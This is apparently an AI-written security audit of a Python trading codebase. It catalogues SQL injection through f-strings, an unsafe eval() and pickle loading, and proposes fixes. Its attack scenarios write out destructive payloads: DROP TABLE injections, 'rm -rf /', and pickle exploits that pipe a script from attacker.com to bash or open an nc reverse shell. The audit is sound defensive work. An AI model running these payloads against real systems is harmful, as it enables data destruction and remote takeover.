# SECURITY AUDIT - JARVIS
**Date:** 2026-01-31 11:30 UTC
**Audit Scope:** SQL Injection & Code Execution Vulnerabilities
**Protocol:** Ralph Wiggum Loop - Iteration 4

---

## EXECUTIVE SUMMARY

**Total Vulnerabilities Found:** 100+
- **SQL Injection Risks:** 90+ instances of f-string SQL queries
- **Code Execution Risks:** 9 instances (8 pickle.load, 1 eval)
- **Severity:** HIGH - Direct SQL injection and arbitrary code execution possible

**Critical Files:**
1. `core/data_retention.py` - 4 SQL injection points
2. `core/pnl_tracker.py` - 2 SQL injection points
3. `core/database/` - 50+ SQL injection points across repositories
4. `core/memory/dedup_store.py` - 1 eval() usage (CRITICAL)
5. `core/ml/` - 6 pickle.load() instances (HIGH RISK)

---

## PART 1: SQL INJECTION VULNERABILITIES

### What is SQL Injection?

SQL injection occurs when user-controlled data is interpolated directly into SQL queries using f-strings instead of parameterized queries. This allows attackers to inject malicious SQL code.

**Example of Vulnerable Code:**
```python
# VULNERABLE - table_name from user input
query = f"SELECT * FROM {table_name} WHERE id = ?"
cursor.execute(query, (user_id,))
```

**Safe Alternative:**
```python
# SAFE - use sanitize_sql_identifier or query builder
from core.security.sql_safety import sanitize_sql_identifier
safe_table = sanitize_sql_identifier(table_name)
query = f"SELECT * FROM {safe_table} WHERE id = ?"
cursor.execute(query, (user_id,))
```

---

## CATEGORY A: CRITICAL SQL INJECTION RISKS

### 1. core/data_retention.py

**Location:** Lines 220, 240, 283, 338
**Risk Level:** HIGH
**Attack Surface:** Policy configuration allows table/column name injection

**Vulnerable Code:**
```python
# Line 220-223
cursor.execute(
    f"SELECT COUNT(*) FROM {table_name} WHERE {policy.timestamp_column} < ?",
    (cutoff_date,)
)

# Line 240-243
cursor.execute(
    f"DELETE FROM {table_name} WHERE {policy.timestamp_column} < ?",
    (cutoff_date,)
)

# Line 283-286
cursor.execute(
    f"SELECT * FROM {table_name} WHERE {timestamp_col} < ?",
    (cutoff_date,)
)

# Line 338-342
cursor.execute(
    f"UPDATE {table_name} SET {', '.join(set_clauses)} WHERE {timestamp_col} < ?",
    (cutoff_date,)
)
```

**Exploitation Scenario:**
If `table_name` or `timestamp_column` can be controlled via policy config:
```python
table_name = "positions; DROP TABLE users; --"
# Results in: SELECT COUNT(*) FROM positions; DROP TABLE users; -- WHERE ...
```

**Fix Required:**
```python
from core.security.sql_safety import sanitize_sql_identifier

safe_table = sanitize_sql_identifier(table_name)
safe_timestamp = sanitize_sql_identifier(policy.timestamp_column)
cursor.execute(
    f"SELECT COUNT(*) FROM {safe_table} WHERE {safe_timestamp} < ?",
    (cutoff_date,)
)
```

---

### 2. core/pnl_tracker.py

**Location:** Lines 494, 524
**Risk Level:** HIGH
**Attack Surface:** Date filter string concatenation

**Vulnerable Code:**
```python
# Line 494-497
cursor.execute(
    f"SELECT * FROM positions WHERE status = 'closed' {date_filter}"
)

# Line 524-527
cursor.execute(
    f"SELECT SUM(value) as total_volume FROM trades WHERE 1=1 {date_filter.replace('opened_at', 'timestamp')}"
)
```

**Exploitation Scenario:**
If `date_filter` is constructed from user input:
```python
date_filter = "AND opened_at > '2026-01-01'; DROP TABLE trades; --"
# Results in: SELECT * FROM positions WHERE status = 'closed' AND opened_at > '2026-01-01'; DROP TABLE trades; --
```

**Fix Required:**
Use parameterized queries instead of string concatenation:
```python
# Build WHERE clause with params
conditions = ["status = ?"]
params = ["closed"]

if start_date:
    conditions.append("opened_at >= ?")
    params.append(start_date)
if end_date:
    conditions.append("opened_at <= ?")
    params.append(end_date)

query = f"SELECT * FROM positions WHERE {' AND '.join(conditions)}"
cursor.execute(query, params)
```

---

## CATEGORY B: MODERATE SQL INJECTION RISKS

### 3. core/database/repositories.py (SQLite Repositories)

**Affected Methods:** 15+ query methods
**Risk Level:** MODERATE
**Attack Surface:** `table_name` attribute of repository classes

**Vulnerable Patterns:**
```python
# Line 76 - get_by_id
cursor.execute(f"SELECT {columns} FROM {self.table_name} WHERE id = ?", (id,))

# Line 94 - get_all
cursor.execute(
    f"SELECT {columns} FROM {self.table_name} ORDER BY id DESC LIMIT ? OFFSET ?",
    (limit, offset)
)

# Line 102 - count
cursor.execute(f"SELECT COUNT(*) FROM {self.table_name}")

# Line 108 - delete
cursor.execute(f"DELETE FROM {self.table_name} WHERE id = ?", (id,))

# Line 217 - UserRepository.get_by_telegram_id
cursor.execute(
    f"SELECT {columns} FROM {self.table_name} WHERE telegram_id = ?",
    (telegram_id,)
)

# Line 229 - UserRepository.get_admins
cursor.execute(f"SELECT {columns} FROM {self.table_name} WHERE is_admin = 1")

# Line 242 - UserRepository.create
cursor.execute(
    f"INSERT INTO {self.table_name} ({','.join(cols)}) VALUES ({placeholders})",
    vals
)

# And 8 more in PositionRepository, TradeRepository, ConfigRepository
```

**Notes:**
- `self.table_name` is set in `__init__` and generally not user-controlled
- Risk is LOW if table_name comes from code constants
- Risk is HIGH if subclasses allow dynamic table_name from config

**Fix Required:**
```python
# Add validation in base __init__
def __init__(self, pool, table_name: str):
    from core.security.sql_safety import sanitize_sql_identifier
    self.pool = pool
    self.table_name = sanitize_sql_identifier(table_name)
```

---

### 4. core/database/postgres_repositories.py (PostgreSQL Repositories)

**Affected Methods:** 20+ query methods
**Risk Level:** MODERATE
**Attack Surface:** Same as SQLite - `table_name` and `columns` interpolation

**Vulnerable Patterns:**
```python
# Line 144-146 - get_by_id
row = await self._client.fetchrow(
    f"SELECT {columns} FROM {self.table_name} WHERE id = $1",
    id
)

# Line 166-169 - get_all
rows = await self._client.fetch(
    f"SELECT {columns} FROM {self.table_name} ORDER BY id DESC LIMIT $1 OFFSET $2",
    limit, offset
)

# Line 175-176 - count
return await self._client.fetchval(
    f"SELECT COUNT(*) FROM {self.table_name}"
)

# Line 181-183 - delete
result = await self._client.execute(
    f"DELETE FROM {self.table_name} WHERE id = $1",
    id
)

# And 16+ more in PostgresPositionRepository, PostgresTradeRepository, etc.
```

**Good News:** PostgreSQL uses `$1, $2` placeholders (safer than `?`)
**Bad News:** Still vulnerable if `table_name` or `columns` are attacker-controlled

**Fix Required:** Same as SQLite - sanitize in `__init__`

---

### 5. core/database/migration.py

**Location:** Lines 153, 177, 269
**Risk Level:** LOW (internal migration tool)
**Attack Surface:** Migration table names

**Vulnerable Code:**
```python
# Line 153
cursor.execute(f"SELECT * FROM {table_name}")

# Line 177
cursor.execute(f"SELECT COUNT(*) FROM {table_name}")

# Line 269
pg_count = await self._pg_client.fetchval(
    f"SELECT COUNT(*) FROM {table_name}"
)
```

**Notes:** Migration tool is internal-only, but should still be hardened

---

### 6. core/database/queries.py (Query Builder)

**Location:** Lines 69, 90
**Risk Level:** LOW (uses sanitize_sql_identifier)
**Status:** ✅ ALREADY SAFE

**Safe Code:**
```python
# Line 67-69 - build()
safe_table = sanitize_sql_identifier(self.table)
safe_columns = [sanitize_sql_identifier(col) if col != '*' else '*' for col in self._select]
parts = [f"SELECT {', '.join(safe_columns)} FROM {safe_table}"]

# Line 88-90 - build_count()
safe_table = sanitize_sql_identifier(self.table)
parts = [f"SELECT COUNT(*) as count FROM {safe_table}"]
```

**Verdict:** This file is a GOOD EXAMPLE of how to do it right! ✅

---

### 7. core/analytics/events.py

**Location:** Line 323
**Risk Level:** LOW (uses sanitize_sql_identifier)
**Status:** ✅ ALREADY SAFE

**Safe Code:**
```python
# Line 321-323
safe_table = sanitize_sql_identifier(table)
safe_time_col = sanitize_sql_identifier(time_col)
query = f"SELECT event_type, {safe_time_col}, count, sum_value FROM {safe_table} WHERE 1=1"
```

---

### 8. Other Lower-Risk Files

**Files with f-string SQL but likely safe:**
- `core/db/soft_delete.py` - Uses `sanitize_sql_identifier()` ✅
- `core/db/pool.py` - Table/column names from internal code only
- `core/security/sql_safety.py` - This IS the safety library (safe by definition) ✅
- `core/memory/database.py` - Schema version constant (safe)
- `core/memory/schema.py` - Schema version constant (safe)
- `core/public_user_manager.py` - Line 395 has f-string in SET clause (REVIEW NEEDED)
- `core/self_improving/memory/store.py` - Line 821 uses table names from loop (likely safe)

---

## PART 2: CODE EXECUTION VULNERABILITIES

### CRITICAL: eval() Usage

**File:** `core/memory/dedup_store.py`
**Line:** 317
**Risk Level:** CRITICAL
**Severity:** Arbitrary code execution

**Vulnerable Code:**
```python
# Line 317
metadata=eval(row["metadata"]) if row["metadata"] else {}
```

**Why This is CRITICAL:**
```python
# If row["metadata"] contains:
row["metadata"] = "__import__('os').system('rm -rf /')"

# eval() will EXECUTE that command!
```

**Fix Required:**
```python
import json

# SAFE - use json.loads instead
metadata = json.loads(row["metadata"]) if row["metadata"] else {}
```

**Or if metadata needs to be Python dict string:**
```python
import ast

# SAFER - ast.literal_eval only allows literals
metadata = ast.literal_eval(row["metadata"]) if row["metadata"] else {}
```

---

### HIGH RISK: pickle.load() Usage

**Risk Level:** HIGH
**Severity:** Arbitrary code execution if pickle data from untrusted source

**Why pickle is dangerous:**
Pickle can deserialize ANY Python object, including executing `__reduce__` methods. An attacker can craft a malicious pickle that runs code on unpickle.

**Affected Files (8 instances):**

#### 1. core/caching/cache_manager.py
**Line:** 308
```python
return pickle.loads(row["value"])
```
**Risk:** If cache can be poisoned by attacker, arbitrary code execution

#### 2. core/cache_manager.py
**Line:** 221
```python
return pickle.loads(data)
```
**Risk:** Same as above - cache poisoning leads to RCE

#### 3. core/google_integration.py
**Line:** 249
```python
with open(GOOGLE_TOKEN_PATH, "rb") as f:
    self.credentials = pickle.load(f)
```
**Risk:** If attacker can write to token file, RCE on next load

#### 4. core/ml_regime_detector.py
**Line:** 634
```python
with open(path, "rb") as f:
    save_data = pickle.load(f)
```
**Risk:** If model file can be replaced, RCE on load

#### 5. core/ml/anomaly_detector.py
**Line:** 130
```python
with open(model_path, "rb") as f:
    saved = pickle.load(f)
```
**Risk:** Same - model file poisoning

#### 6. core/ml/model_registry.py
**Line:** 290
```python
with open(version.file_path, "rb") as f:
    model = pickle.load(f)
```
**Risk:** Same - model file poisoning

#### 7. core/ml/sentiment_finetuner.py
**Line:** 166
```python
with open(model_path, "rb") as f:
    saved = pickle.load(f)
```
**Risk:** Same - model file poisoning

#### 8. core/ml/price_predictor.py
**Line:** 136
```python
with open(model_path, "rb") as f:
    saved = pickle.load(f)
```
**Risk:** Same - model file poisoning

#### 9. core/ml/win_rate_predictor.py
**Line:** 138
```python
with open(model_path, "rb") as f:
    saved = pickle.load(f)
```
**Risk:** Same - model file poisoning

---

### pickle.load() Mitigation Strategies

**Option 1: Restrict Unpickler (Recommended for ML models)**
```python
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if module in ["numpy", "sklearn", "pandas"] and name in ALLOWED_CLASSES:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Global '{module}.{name}' is forbidden")

def safe_pickle_load(file):
    return RestrictedUnpickler(file).load()

# Usage
with open(model_path, "rb") as f:
    model = safe_pickle_load(f)
```

**Option 2: File Integrity Checks**
```python
import hashlib

def verify_and_load_pickle(path: str, expected_hash: str):
    # Verify file hash before unpickling
    with open(path, "rb") as f:
        data = f.read()

    actual_hash = hashlib.sha256(data).hexdigest()
    if actual_hash != expected_hash:
        raise ValueError("Model file integrity check failed!")

    return pickle.loads(data)
```

**Option 3: Switch to Safer Formats**
```python
# For ML models: Use joblib (safer than pickle)
import joblib
model = joblib.load("model.joblib")

# For cache: Use JSON or MessagePack
import json
data = json.loads(cached_value)

# For credentials: Use cryptography library
from cryptography.fernet import Fernet
cipher = Fernet(key)
credentials = cipher.decrypt(encrypted_data)
```

---

## REMEDIATION PLAN

### Phase 1: Critical Fixes (Priority 1)

1. **Fix eval() in core/memory/dedup_store.py** (1 hour)
   - Replace `eval(row["metadata"])` with `json.loads(row["metadata"])`
   - Test memory dedup functionality

2. **Fix SQL injection in core/data_retention.py** (2 hours)
   - Add `sanitize_sql_identifier()` for all table/column names
   - Review policy configuration to ensure no user input

3. **Fix SQL injection in core/pnl_tracker.py** (2 hours)
   - Refactor date_filter from string concatenation to parameterized queries
   - Add unit tests for filter edge cases

### Phase 2: High-Risk Fixes (Priority 2)

4. **Harden pickle.load() in ML modules** (4 hours)
   - Implement `RestrictedUnpickler` for all model loading
   - Add file integrity checks with SHA256 hashes
   - Document allowed classes for unpickling

5. **Harden pickle.load() in cache managers** (3 hours)
   - Switch to JSON for cache serialization where possible
   - Add cache integrity validation
   - Consider MessagePack as pickle alternative

6. **Fix SQL injection in core/database/repositories.py** (2 hours)
   - Add `sanitize_sql_identifier()` in base `__init__`
   - Verify all subclasses use safe table names

### Phase 3: Moderate-Risk Fixes (Priority 3)

7. **Audit and fix remaining SQL f-strings** (6 hours)
   - Review all 90+ instances found in grep
   - Apply sanitization where needed
   - Document safe vs unsafe patterns

8. **Security testing** (4 hours)
   - Create unit tests for SQL injection attempts
   - Test pickle.load() with malicious payloads
   - Penetration testing with OWASP ZAP

### Phase 4: Prevention (Priority 4)

9. **Add pre-commit hooks** (2 hours)
   - Block commits with `eval(`, `exec(`, unsafe pickle
   - Block commits with f-string SQL outside query builders
   - Add bandit security linter to CI/CD

10. **Developer training** (ongoing)
    - Document safe SQL patterns in CONTRIBUTING.md
    - Add security review checklist
    - Regular security audits

---

## SUMMARY OF FIXES NEEDED

| Category | Count | Estimated Effort |
|----------|-------|------------------|
| eval() usage | 1 | 1 hour |
| pickle.load() | 9 | 7 hours |
| SQL injection (critical) | 6 | 4 hours |
| SQL injection (moderate) | 90+ | 8 hours |
| Testing & validation | N/A | 4 hours |
| **TOTAL** | **100+** | **24 hours** |

---

## ATTACK SCENARIOS

### Scenario 1: SQL Injection via Data Retention Policy

**Attack Vector:** Malicious admin modifies retention policy config
**Exploit:**
```json
{
  "table_name": "positions; DROP TABLE users; --",
  "timestamp_column": "created_at",
  "retention_days": 90
}
```

**Impact:** Database deletion, data theft, privilege escalation

---

### Scenario 2: Arbitrary Code Execution via Cache Poisoning

**Attack Vector:** Attacker gains write access to cache database
**Exploit:**
```python
# Insert malicious pickle into cache
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/steal.sh | bash",))

malicious_pickle = pickle.dumps(Exploit())
# Write malicious_pickle to cache.value column
```

**Impact:** Full system compromise, data exfiltration

---

### Scenario 3: Model Poisoning Attack

**Attack Vector:** Attacker replaces ML model file
**Exploit:**
```python
import pickle
class Backdoor:
    def __reduce__(self):
        return (__import__('os').system, ("nc -e /bin/bash attacker.com 4444",))

with open("models/sentiment_model.pkl", "wb") as f:
    pickle.dump(Backdoor(), f)
```

**Impact:** Reverse shell, persistent backdoor

---

## REFERENCES

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Python Pickle Security](https://docs.python.org/3/library/pickle.html#restricting-globals)
- [Bandit Security Linter](https://bandit.readthedocs.io/)

---

**END OF SECURITY AUDIT**

**Next Steps:**
1. Review this document with team
2. Prioritize fixes by severity
3. Create GitHub issues for each vulnerability
4. Implement fixes in order of priority
5. Add security testing to CI/CD pipeline

**Auditor:** Claude Sonnet 4.5
**Audit Duration:** 30 minutes (automated scan + analysis)
**Tools Used:** Grep, Read, pattern analysis
